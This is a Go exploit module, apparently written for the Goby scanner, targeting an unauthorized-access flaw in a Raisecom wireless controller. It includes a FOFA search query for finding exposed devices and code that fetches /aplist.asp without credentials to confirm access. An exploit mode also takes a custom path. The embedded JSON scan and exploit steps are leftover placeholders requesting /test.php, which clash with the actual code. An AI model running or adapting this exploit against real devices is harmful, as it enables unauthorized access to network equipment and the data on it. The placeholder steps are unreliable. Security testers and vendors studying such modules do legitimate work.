package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Wireless controller /main.asp Unauthorized Access Vulnerability",
    "Description": "<p>Riseconda Technology Development Co., Ltd. | Company Profile Riseconda is an industry-leading provider of optical network products and system solutions. Founded in 1999, the company has been deeply involved in the communications industry for more than 20 years, providing customers with information and communication infrastructure construction, as well as digital and intelligent transformation and upgrading solutions and technical services in the fields of all-optical network, switching routing, cloud-network-security integration, wireless communication, and edge computing.</p>",
    "Product": "Riseconda Technology",
    "Homepage": "http://www.raisecom.com.cn/",
    "DisclosureDate": "2024-10-28",
    "PostTime": "2024-11-06",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "title=\"无线控制器\" && header=\"pragma\"",
    "GobyQuery": "title=\"无线控制器\" && header=\"pragma\"",
    "Level": "0",
    "Impact": "<p>1. Attackers can access and obtain sensitive data, such as user information and enterprise secrets.</p><p> 2. In some cases, an attacker may exploit the vulnerability to execute system commands to control the affected system.</p>",
    "Recommendation": "<p>Add user identity authentication mechanism or token verification to increase permission control over the function points of the system.</p>",
    "References": [
        "https://wx.zsxq.com/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "api",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "3.2",
    "Translation": {
        "CN": {
            "Name": "无线控制器 /main.asp 未授权访问漏洞",
            "Product": "瑞斯康达科技",
            "Description": "<p>瑞斯康达科技发展股份有限公司| 公司简介&nbsp;瑞斯康达是业界领先的光网络产品及系统解决方案提供商。 公司成立于1999年，深耕通信行业二十余年，在全光网络、交换路由、云网安融合、无线通信、边缘计算等领域，为客户提供信息通信基础设施建设，以及数字化、智能化转型升级解决方案和技术服务。<br></p>",
            "Recommendation": "<p>加入用户身份认证机制或token验证，对系统的功能点增加权限控制。<br></p>",
            "Impact": "<p>1.攻击者可以访问并获取敏感数据，如用户信息、企业机密等。</p><p>&nbsp;2.部分情况下，攻击者可能利用漏洞执行系统命令，控制受影响的系统。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Wireless controller /main.asp Unauthorized Access Vulnerability",
            "Product": "Riseconda Technology",
            "Description": "<p>Riseconda Technology Development Co., Ltd. | Company Profile Riseconda is an industry-leading provider of optical network products and system solutions. Founded in 1999, the company has been deeply involved in the communications industry for more than 20 years, providing customers with information and communication infrastructure construction, as well as digital and intelligent transformation and upgrading solutions and technical services in the fields of all-optical network, switching routing, cloud-network-security integration, wireless communication, and edge computing.<br></p>",
            "Recommendation": "<p>Add user identity authentication mechanism or token verification to increase permission control over the function points of the system.<br></p>",
            "Impact": "<p>1. Attackers can access and obtain sensitive data, such as user information and enterprise secrets.</p><p>&nbsp;2. In some cases, an attacker may exploit the vulnerability to execute system commands to control the affected system.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/main.asp"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/aplist.asp": "IP地址",
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"api": {"/aplist.asp", "IP地址"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = "未授权访问 访问路径为:\n" + "http://" + expResult.HostInfo.HostInfo + "/main.asp"
			return expResult
		},
	))
}
